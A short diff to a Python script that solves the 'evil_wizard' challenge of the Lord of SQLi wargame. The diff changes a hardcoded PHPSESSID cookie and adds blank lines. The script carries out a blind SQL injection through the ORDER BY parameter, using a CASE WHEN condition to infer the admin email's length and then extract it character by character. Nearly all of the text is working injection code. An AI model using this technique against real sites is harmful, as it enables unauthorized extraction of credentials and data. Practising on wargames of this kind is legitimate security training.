@@ -2,7 +2,7 @@ from string import printable
 import requests
 
 session = requests.Session()
-cookies = {"PHPSESSID": "ph05kkvqbhhs9mdqsli7e95vi5"}
+cookies = {"PHPSESSID": "qq08u1j4nnku65oqdnkop0hhjo"}
 
 url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=(select case when (id='admin' and length(email)={}) then 1 else 3 end)--+"
 for i in range(200):
@@ -22,3 +22,5 @@ for j in range(1,l+1):
             print("Password : {}".format(pw), end='\r')
             break
 print("Password :", pw)
+
+
